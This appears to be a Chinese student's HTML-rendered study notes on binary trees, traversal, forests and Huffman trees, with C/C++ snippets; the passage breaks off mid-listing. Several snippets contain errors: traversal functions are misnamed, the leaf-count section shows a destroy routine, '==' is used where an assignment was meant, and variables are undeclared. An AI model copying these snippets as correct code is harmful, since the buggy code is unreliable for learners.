c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">BiNode</span>&#123;</span><br>    TElemType data;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">BiNode</span> *<span class="hljs-title">lChild</span>,*<span class="hljs-title">parent</span>,*<span class="hljs-title">rChild</span>;</span><br>&#125;BiNode,*BiTree;<br><br></code></pre></td></tr></table></figure><ul><li>在<code>n</code>个节点的二叉链表中，必有<code>2n</code>个链域，除了根节点没有双亲，所以一定会有<code>n-1</code>个节点的链域存放指针，指向非空的子女节点。</li></ul><p>  所以一共有<code>n+1</code>个空指针域</p></li><li><p>二叉树的遍历</p></li></ol><ul><li><p>先序遍历</p><p>先访问根节点，再访问左子树，再访问右子树</p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/%E4%BA%8C%E5%8F%89%E6%A0%91%E5%85%88%E5%BA%8F%E9%81%8D%E5%8E%86%E7%AE%97%E6%B3%95.png"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">visit</span><span class="hljs-params">(BiTree T)</span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>,T-&gt;data);<br>&#125;<br><br>status <span class="hljs-title function_">PreOrderTraverse</span><span class="hljs-params">(BiTree T)</span>&#123;<br>    <span class="hljs-keyword">if</span>(T==<span class="hljs-literal">NULL</span>)&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<span class="hljs-keyword">else</span> &#123;<br>        visit(T);<br>        PreOrderTraverse(T-&gt;lChild);<br>        PreOrderTraverse(T-&gt;rChild);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure></li><li><p>中序遍历</p><p>先访问左子树，再访问根节点，再访问右子树</p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9A%84%E4%B8%AD%E5%BA%8F%E9%81%8D%E5%8E%86.png"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">visit</span><span class="hljs-params">(BiTree T)</span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>,T-&gt;data);<br>&#125;<br><br>status <span class="hljs-title function_">PreOrderTraverse</span><span class="hljs-params">(BiTree T)</span>&#123;<br>    <span class="hljs-keyword">if</span>(T==<span class="hljs-literal">NULL</span>)&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<span class="hljs-keyword">else</span> &#123;<br>        PreOrderTraverse(T-&gt;lChild);<br>        visit(T);<br>        PreOrderTraverse(T-&gt;rChild);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure></li><li><p>后续遍历</p><p>先访问左子树，在访问右子树，最后访问根节点   </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><br><span class="hljs-type">void</span> <span class="hljs-title function_">visit</span><span class="hljs-params">(BiTree T)</span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>,T-&gt;data);<br>&#125;<br><br>status <span class="hljs-title function_">PreOrderTraverse</span><span class="hljs-params">(BiTree T)</span>&#123;<br>    <span class="hljs-keyword">if</span>(T==<span class="hljs-literal">NULL</span>)&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<span class="hljs-keyword">else</span> &#123;<br>        PreOrderTraverse(T-&gt;lChild);<br>        PreOrderTraverse(T-&gt;rChild);<br>        visit(T);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>例题：</p><p>使用二叉树表达算术表达式</p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/%E5%89%8D%EF%BC%8C%E4%B8%AD%EF%BC%8C%E5%90%8E%E7%BC%80%E8%A1%A8%E8%BE%BE%E5%BC%8F.png"></p></li><li><p>递归遍历的算法分析</p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/%E9%81%8D%E5%8E%86%E7%9A%84%E7%AE%97%E6%B3%95%E5%88%86%E6%9E%90.png" alt="img"></p><p>从虚线出发到每一个终点路径每个节点经历3次</p></li><li><p>非递归遍历</p><p>中序遍历</p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/%E4%B8%AD%E5%BA%8F%E9%81%8D%E5%8E%86%E7%9A%84%E9%9D%9E%E9%80%92%E5%BD%92%E7%AE%97%E6%B3%95.png"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c++"><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;iostream&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;stack&quot;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> status int</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> OK 1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ERROR (-1)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> true 1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> false 0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> TElemType char</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SIZE 100</span><br><span class="hljs-function">status <span class="hljs-title">InOrderTraverse</span><span class="hljs-params">(BiTree&amp; T)</span></span>&#123;<br>    std::stack&lt;BiTree&gt; stack;<span class="hljs-comment">//申请一个栈</span><br>    BiTree moveNode=T;<br>    <span class="hljs-keyword">while</span>(!stack.<span class="hljs-built_in">empty</span>()||moveNode!= <span class="hljs-literal">nullptr</span>)&#123;<br>        <span class="hljs-keyword">if</span>(moveNode!= <span class="hljs-literal">nullptr</span>)&#123;<br>            stack.<span class="hljs-built_in">push</span>(moveNode);<br>            moveNode=moveNode-&gt;lChild;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">auto</span> p=stack.<span class="hljs-built_in">top</span>();<span class="hljs-comment">//得到栈首的元素</span><br>            std::cout&lt;&lt;p-&gt;data&lt;&lt;<span class="hljs-string">&quot; &quot;</span>;<br>            stack.<span class="hljs-built_in">pop</span>();<br>            moveNode=p-&gt;rChild;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br><br><br></code></pre></td></tr></table></figure></li><li><p>层次遍历</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">status <span class="hljs-title">LeveIOrder</span><span class="hljs-params">(BiTree&amp; biTree)</span></span>&#123;<br>    std::queue&lt;BiTree&gt; queue;<br>    BiNode* pMove=biTree;<br>    queue.<span class="hljs-built_in">push</span>(biTree);<br>    <span class="hljs-keyword">while</span>(!queue.<span class="hljs-built_in">empty</span>())&#123;<br>        <span class="hljs-keyword">if</span>(queue.<span class="hljs-built_in">front</span>()-&gt;lChild!= <span class="hljs-literal">nullptr</span>)&#123;<br>            queue.<span class="hljs-built_in">push</span>(queue.<span class="hljs-built_in">front</span>()-&gt;lChild);<br>        &#125;<br>        <span class="hljs-keyword">if</span>(queue.<span class="hljs-built_in">front</span>()-&gt;rChild!= <span class="hljs-literal">nullptr</span>)&#123;<br>            queue.<span class="hljs-built_in">push</span>(queue.<span class="hljs-built_in">front</span>()-&gt;rChild);<br>        &#125;<br>        std::cout&lt;&lt;queue.<span class="hljs-built_in">front</span>()-&gt;data&lt;&lt;<span class="hljs-string">&quot; &quot;</span>;<br>        queue.<span class="hljs-built_in">pop</span>();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li></ul><ol start="11"><li><p>二叉树的创建</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c">status <span class="hljs-title function_">CreatBitree</span><span class="hljs-params">(BiTree* biTree)</span>&#123;<br>    TElemType ch;<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%c&quot;</span>,&amp;ch);<br>    <span class="hljs-keyword">if</span>(ch==<span class="hljs-string">&#x27;#&#x27;</span>)&#123;<br>        <span class="hljs-keyword">return</span> OK;<br>    &#125;<span class="hljs-keyword">else</span> &#123;<br>        (*biTree)=(BiNode*) <span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(BiNode));<br>        (*biTree)-&gt;lChild=<span class="hljs-literal">NULL</span>;<br>        (*biTree)-&gt;rChild=<span class="hljs-literal">NULL</span>;<br>        (*biTree)-&gt;data=ch;<br>        CreatBitree(&amp;(*biTree)-&gt;lChild);<br>        CreatBitree(&amp;(*biTree)-&gt;rChild);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><ul><li><p>定义：</p><p>‘#’代表没有节点</p></li></ul><p>所以上面代码的实现是，根据符号来确定是否要创建一个二叉树</p></li><li><p>二叉树的复制</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c">status <span class="hljs-title function_">Copy</span><span class="hljs-params">(BiTree T, BiTree *newBitree)</span> &#123;<br>    <span class="hljs-keyword">if</span> (T != <span class="hljs-literal">NULL</span>) &#123;<br>        *newBitree = (BiTree) <span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(BiNode));<br>        (*newBitree)-&gt;lChild=<span class="hljs-literal">NULL</span>;<br>        (*newBitree)-&gt;rChild=<span class="hljs-literal">NULL</span>;<br>        (*newBitree)-&gt;data=T-&gt;data;<br>        Copy(T-&gt;lChild,&amp;(*newBitree)-&gt;lChild);<br>        Copy(T-&gt;rChild,&amp;(*newBitree)-&gt;rChild);<br>    &#125;<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>计算二叉树的深度</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">Depen</span><span class="hljs-params">(BiTree biTree)</span>&#123;<br>    <span class="hljs-keyword">if</span>(biTree==<span class="hljs-literal">NULL</span>)&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        m= Depen(biTree-&gt;lChild);<br>        n= Depen(biTree-&gt;rChild);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(n&gt;m)&#123;<br>        <span class="hljs-keyword">return</span> (n+<span class="hljs-number">1</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">return</span> m+<span class="hljs-number">1</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>计算二叉树的节点数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">NodeCount</span><span class="hljs-params">(BiTree biTree)</span> &#123;<br>    <span class="hljs-keyword">if</span> (biTree != <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span> NodeCount(biTree-&gt;lChild)+ NodeCount(biTree-&gt;rChild)+<span class="hljs-number">1</span>;<br>    &#125;<span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>计算叶子节点的个数（叶子节点是左右孩子都为<code>NULL</code>的节点）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c">status <span class="hljs-title function_">DestroyBiTree</span><span class="hljs-params">(BiTree *biTree)</span> &#123;<br>    <span class="hljs-keyword">if</span> (*biTree == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> ((*biTree)-&gt;lChild != <span class="hljs-literal">NULL</span>) &#123;<br>        DestroyBiTree(&amp;(*biTree)-&gt;lChild);<br>    &#125;<br>    <span class="hljs-keyword">if</span> ((*biTree)-&gt;rChild != <span class="hljs-literal">NULL</span>) &#123;<br>        DestroyBiTree(&amp;(*biTree)-&gt;rChild);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;  %c&quot;</span>, (*biTree)-&gt;data);<br>    <span class="hljs-built_in">free</span>((*biTree));<br>    (*biTree)==<span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>线索二叉树</p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/%E4%BA%8C%E5%8F%89%E6%90%9C%E7%B4%A2%E6%A0%91.png"></p><p> <img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/%E4%BA%8C%E5%8F%89%E6%90%9C%E7%B4%A2%E6%A0%91%E7%9A%84%E8%A7%84%E5%88%99.png"></p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/%E5%A2%9E%E5%8A%A0%E4%B8%80%E4%B8%AA%E5%A4%B4%E7%BB%93%E7%82%B9.png"></p></li></ol><h2 id="树和森林"><a href="#树和森林" class="headerlink" title="树和森林"></a>树和森林</h2><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/%E6%A0%91%E5%92%8C%E6%A3%AE%E6%9E%97.png"></p><h3 id="树的存储结构"><a href="#树的存储结构" class="headerlink" title="树的存储结构"></a>树的存储结构</h3><h4 id="双亲表示法"><a href="#双亲表示法" class="headerlink" title="双亲表示法"></a>双亲表示法</h4><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91%2F%E5%8F%8C%E4%BA%B2%E8%A1%A8%E7%A4%BA%E6%B3%95.png"></p><p>其中A是虚拟的头节点</p><p>代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">PTNode</span>&#123;</span><br>    TElemType data;<br>    <span class="hljs-type">int</span> parent;<br>&#125;PTNode;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span>&#123;</span><br>    PTNode nodes[BUFSIZ];<br>    <span class="hljs-type">int</span> r,n;<span class="hljs-comment">//存放根节点和节点个数</span><br>&#125;PTree;<br></code></pre></td></tr></table></figure><h4 id="孩子链表"><a href="#孩子链表" class="headerlink" title="孩子链表"></a>孩子链表</h4><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/%E5%AD%A9%E5%AD%90%E9%93%BE%E8%A1%A8.png"></p><h4 id="带双亲的孩子链表"><a href="#带双亲的孩子链表" class="headerlink" title="带双亲的孩子链表"></a>带双亲的孩子链表</h4><p>只是在孩子链表的基础上多加了双亲的位置</p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/%E5%B8%A6%E5%8F%8C%E4%BA%B2%E7%9A%84%E5%AD%A9%E5%AD%90%E9%93%BE%E8%A1%A8.png"></p><h4 id="孩子兄弟表示法（二叉树表示法，二叉链表表示法）"><a href="#孩子兄弟表示法（二叉树表示法，二叉链表表示法）" class="headerlink" title="孩子兄弟表示法（二叉树表示法，二叉链表表示法）"></a>孩子兄弟表示法（二叉树表示法，二叉链表表示法）</h4><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/%E5%AD%A9%E5%AD%90%E5%85%84%E5%BC%9F%E8%A1%A8%E7%A4%BA%E6%B3%95.png"></p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/%E5%AD%A9%E5%AD%90%E5%85%84%E5%BC%9F%E8%A1%A8%E7%A4%BA%E6%B3%95%E5%AE%9E%E6%93%8D.png"></p><ul><li><p>将树转换为二叉树</p><p>兄弟相连留长子</p><p>意思是：将兄弟的连起来，只保留双亲与长子的连线</p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/%E5%B0%86%E6%A0%91%E8%BD%AC%E5%8C%96%E4%B8%BA%E5%85%84%E5%BC%9F%E4%BA%8C%E5%8F%89%E6%A0%91%EF%BC%88%E5%85%84%E5%BC%9F%E5%AD%98%E5%82%A8%E6%B3%95%EF%BC%89.png"></p></li><li><p>将兄弟二叉树，转变为普通的树</p><p>左孩子右右连双亲，去掉原来的右孩子线</p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/%E4%BA%8C%E5%8F%89%E6%A0%91%E5%8F%98%E6%A0%91.png"></p></li></ul><h3 id="森林和二叉树的转化"><a href="#森林和二叉树的转化" class="headerlink" title="森林和二叉树的转化"></a>森林和二叉树的转化</h3><ol><li><p>树变二叉树根相连</p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/%E6%A3%AE%E6%9E%97%E5%8F%98%E6%88%90%E4%BA%8C%E5%8F%89%E6%A0%91.png"></p></li><li><p>二叉树变森林</p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/%E4%BA%8C%E5%8F%89%E6%A0%91%E5%8F%98%E6%A3%AE%E6%9E%97.png"></p></li></ol><h3 id="树的遍历"><a href="#树的遍历" class="headerlink" title="树的遍历"></a>树的遍历</h3><ol><li><p>先根</p><p>如树不为空，那么先遍历根然后在遍历各个子树</p></li><li><p>后根</p><p>若树不为空，后根遍历各课子树，然后访问根节点</p></li></ol><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/%E6%A0%91%E7%9A%84%E9%81%8D%E5%8E%86.png"></p><h3 id="森林的遍历"><a href="#森林的遍历" class="headerlink" title="森林的遍历"></a>森林的遍历</h3><p>和二叉树的遍历方式一致</p><ol><li><p>先序遍历</p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/%E6%A3%AE%E6%9E%97%E7%9A%84%E9%81%8D%E5%8E%86.png"></p></li><li><p>中序遍历</p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/%E6%A3%AE%E6%9E%97%E7%9A%84%E4%B8%AD%E5%BA%8F%E9%81%8D%E5%8E%86.png"></p></li></ol><h2 id="哈夫曼树（最优二叉树）"><a href="#哈夫曼树（最优二叉树）" class="headerlink" title="哈夫曼树（最优二叉树）"></a>哈夫曼树（最优二叉树）</h2><h3 id="判断树"><a href="#判断树" class="headerlink" title="判断树"></a>判断树</h3><p>左边是改进的选择判断语句</p><p>右边是普通的选择判断语句</p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/%E5%88%A4%E6%96%AD%E6%A0%91.png"></p><ol><li><p>基本概念</p><ul><li><p>路径</p><p>从一个结点到另一个结点的分支构成了结点间的路径</p></li><li><p>结点的路径长度</p><p>两结点间的路径上的分支数</p><p>A-&gt;D 的路径长度是  2</p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/%E8%B7%AF%E5%BE%84%E9%95%BF%E5%BA%A62.png"></p></li><li><p>树的路径长度</p><p>从根结点到每个结点的路径长度之和</p></li><li><p>权</p><p>将树中的结点赋一个有某种含义的数值，称为<strong>结点的权</strong></p></li><li><p>结点的带权路径长度</p><p>从根到该节点之间的路径长度×该节点权的结果</p></li><li><p>树的带权路径长度</p><p>树中所有的叶子结点的带权路径长度之和</p></li></ul></li></ol><h3 id="哈夫曼树"><a href="#哈夫曼树" class="headerlink" title="哈夫曼树"></a>哈夫曼树</h3><p>最优树，也就是带权路径长度最短的树</p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/%E5%93%88%E5%A4%AB%E6%9B%BC%E6%A0%91.png"></p><ol><li>满二叉树不一定是最优二叉树</li></ol><p><strong>哈夫曼树的特点</strong></p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/%E5%93%88%E5%A4%AB%E6%9B%BC%E6%A0%91%E7%9A%84%E7%89%B9%E7%82%B9.png"></p><ul><li>只有度（子树个数 ）0为0或2的结点</li><li>一共有<code>2n-1</code>个结点，且新构成的结点都是度为二的结点，原来的结点都是度为一的结点</li><li>一共有n个叶子结点（原来的结点，也就是度为0的结点）</li></ul><h4 id="哈夫曼树的构造"><a href="#哈夫曼树的构造" class="headerlink" title="哈夫曼树的构造"></a>哈夫曼树的构造</h4><ol><li>权值越大的先构造（贪心算法）</li></ol><p>   步骤</p><ul><li>构造森林全是根</li><li>选用两小造新树</li><li>删除两小添新人</li><li>重复2，3剩单根</li></ul><p>   <img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/%E5%93%88%E5%A4%AB%E6%9B%BC%E6%A0%91%E7%9A%84%E6%9E%84%E9%80%A0.png"></p><p>   删除两小的意思是：删除原来队列里面的两个小的</p><p>   <img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/%E5%93%88%E5%A4%AB%E6%9B%BC%E6%A0%91%E7%9A%84%E6%9E%84%E9%80%A0%E5%AE%9E%E4%BE%8B.png"></p><p>   直到剩下一棵树，就是哈夫曼树</p><p>   下面是一个例题</p><p>   <img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/%E5%93%88%E5%A4%AB%E6%9B%BC%E6%A0%91%E7%9A%84%E6%9E%84%E9%80%A0%E4%BE%8B%E9%A2%98.png"></p><ol start="2"><li><p>代码实现</p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/%E5%93%88%E5%A4%AB%E6%9B%BC%E6%A0%91%E7%9A%84%E7%AE%97%E6%B3%95%E5%AE%9E%E7%8E%B0.png"></p><p>注意重置min的过程，可以改进算法，但是作者还没有学到遍历，所以并没有采取其他方式</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span 